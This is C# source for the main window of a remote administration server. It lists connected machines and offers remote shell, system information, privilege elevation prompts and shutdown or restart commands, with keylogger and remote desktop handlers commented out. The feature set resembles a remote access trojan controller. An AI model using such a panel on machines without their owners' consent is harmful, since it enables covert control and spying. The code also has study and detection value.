using Common.Enums;
using Server.Forms;
using Server.Networking;
using Server.Networking.Packets.ClientServices;
//using Server.Networking.Packets.MessageBox;
using System.Net.Sockets;

namespace Server.Forms
{
    public partial class FrmMain : Form
    {
        public ListenServer ListenServer { get; set; }

        private bool _titleUpdateRunning;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        public FrmMain()
        {
            InitializeServer();
            InitializeComponent();
        }

        //cập nhật trạng thái kết nối của client trong ListView
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);// trả về dòng tương ứng với client đó
            if (item != null)
                item.SubItems[4].Text = text;
        }

        //cập nhật trạng thái hoạt động của user trong ListView
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);// trả về dòng tương ứng với client đó
            if (item != null)
                item.SubItems[5].Text = userStatus.ToString();
        }

        private void InitializeServer()
        {
            ListenServer = new ListenServer(10000);
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
            ListenServer.StatusUpdated += SetStatusByClient;
            ListenServer.UserStatusUpdated += SetUserStatusByClient;
        }
        private void StartConnectionListener()
        {
            try
            {
                ListenServer.RunAsync();
                ThreadPool.QueueUserWorkItem(ProcessClientConnections);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.StopAsync();
            }
            catch (Exception)
            {
                ListenServer.StopAsync();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            StartConnectionListener();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.StopAsync().Wait();
            ListenServer.StatusUpdated -= SetStatusByClient;
            ListenServer.UserStatusUpdated -= SetUserStatusByClient;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Số Lượng Kết Nối: {0} [Đã Lựa Chọn: {1}]", ListenServer.ConnectedClients.Count, selected)
                        : string.Format("Số Lượng Kết Nối: {0}", ListenServer.ConnectedClients.Count);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        Thread.Sleep(1000);
                        continue;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.Value.IpAddress,
                    client.Value.UserAtPc,
                    client.Value.OperatingSystem,
                    client.Value.CountryWithCode,
                    "Connected",
                    "Active",
                    client.Value.AccountType
                })
                { Tag = client };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        //lấy các client được chọn trong ListView
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }
        //tìm dòng tương ứng với client
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        // System Information Menu Items
        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }
        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        //private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    foreach (Client c in GetSelectedClients())
        //    {
        //        FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
        //        frmTm.Show();
        //        frmTm.Focus();
        //    }
        //}

        //private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    foreach (Client c in GetSelectedClients())
        //    {
        //        FrmFileManager frmTm = FrmFileManager.CreateNewOrGetExisting(c);
        //        frmTm.Show();
        //        frmTm.Focus();
        //    }
        //}

        //private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    foreach (Client c in GetSelectedClients())
        //    {
        //        FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
        //        frmKl.Show();
        //        frmKl.Focus();
        //    }
        //}

        //private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    foreach (Client c in GetSelectedClients())
        //    {
        //        var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
        //        frmRd.Show();
        //        frmRd.Focus();
        //    }
        //}

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                _ = c.QueuePacketAsync(new ClientReconnectPacket());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.SendPacket(new ClientDisconnectPacket());
            }
        }

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.SendPacket(new AskElevatePacket());
            }
        }

        //private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    if (lstClients.SelectedItems.Count != 0)
        //    {
        //        using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
        //        {
        //            if (frm.ShowDialog() == DialogResult.OK)
        //            {
        //                foreach (Client c in GetSelectedClients())
        //                {
        //                    c.SendPacket(new ShowMessageBoxPacket
        //                    {
        //                        Caption = frm.MsgBoxCaption,
        //                        Text = frm.MsgBoxText,
        //                        Button = frm.MsgBoxButton,
        //                        Icon = frm.MsgBoxIcon
        //                    });
        //                }
        //            }
        //        }
        //    }
        //}

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.SendPacket(new ShutdownActionPacket { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.SendPacket(new ShutdownActionPacket { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.SendPacket(new ShutdownActionPacket { Action = ShutdownAction.Standby });
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
